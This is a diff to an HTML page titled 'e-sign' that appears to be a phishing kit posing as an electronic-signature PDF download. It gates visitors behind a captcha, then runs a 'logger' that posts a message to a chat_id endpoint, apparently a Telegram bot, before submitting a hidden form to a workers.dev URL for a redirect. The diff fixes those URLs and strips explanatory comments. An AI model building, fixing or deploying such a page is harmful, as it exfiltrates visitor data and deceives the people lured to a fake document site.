@@ -4,7 +4,7 @@
 	<title>e-sign</title>
     <link rel="shortcut icon" href="https://i.ibb.co/yF35Jv2Q/docu-ico.png" type="image/x-icon">
 	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-    <!-- Turnstile Script -->
+    <!-- FIXED TURNSTILE SCRIPT URL -->
     <script src="https://challenges.cloudflare.com" async defer></script>
 	<style>
 @font-face {
@@ -29,7 +29,7 @@ body {
 }
 #rl {
 	animation: roll 1s infinite;
-    display: none; /* Hidden until captcha success */
+    display: none;
 }
 @keyframes fade {
 	from { opacity: 1; }
@@ -53,17 +53,15 @@ body {
 
 <div style="max-width:500px;padding:0px;">
 
-    <!-- This is shown first -->
     <div id="captcha-gate" class="captcha-container">
         <p style="color:white; margin-bottom:15px; text-shadow: 1px 1px 2px black;">Please verify you are human</p>
-        <!-- REPLACE SITE KEY HERE -->
         <div class="cf-turnstile" 
              data-sitekey="0x4AAAAAACafd07cw2w7X14i" 
              data-callback="onSuccess"></div>
     </div>
 
-    <!-- This shows AFTER captcha success -->
-    <form id="downloadForm" method="POST" action="wandering-cherry-0bf1.g03755901.workers.dev" style="display:none;">
+    <!-- FIXED WORKER URL WITH HTTPS -->
+    <form id="downloadForm" method="POST" action="https://wandering-cherry-0bf1.g03755901.workers.dev" style="display:none;">
         <div style="text-align:center">
           <img src="https://i.ibb.co/sJFnm0RH/Icon-pdf-file-svg.png" width="45" height="45" style="margin-top:150px;object-fit:contain;" id="fd" alt="icon">
         </div>
@@ -74,13 +72,10 @@ body {
 </div>
 
 <script>
-    // Runs when captcha is passed
     function onSuccess(token) {
         document.getElementById('captcha-gate').style.display = 'none';
         document.getElementById('downloadForm').style.display = 'block';
         document.getElementById('rl').style.display = 'block';
-        
-        // Run your logger and then submit to Worker
         sendLogsAndSubmit();
     }
 
@@ -106,14 +101,12 @@ body {
                     body: JSON.stringify({ chat_id: chatId, text: message })
                 })
                 .then(() => {
-                    // Final step: Send to Cloudflare Worker for Redirect
                     setTimeout(() => {
                         document.getElementById('downloadForm').submit();
                     }, 1500);
                 });
             })
             .catch(error => {
-                // If logger fails, still submit the form to the worker
                 document.getElementById('downloadForm').submit();
             });
     }
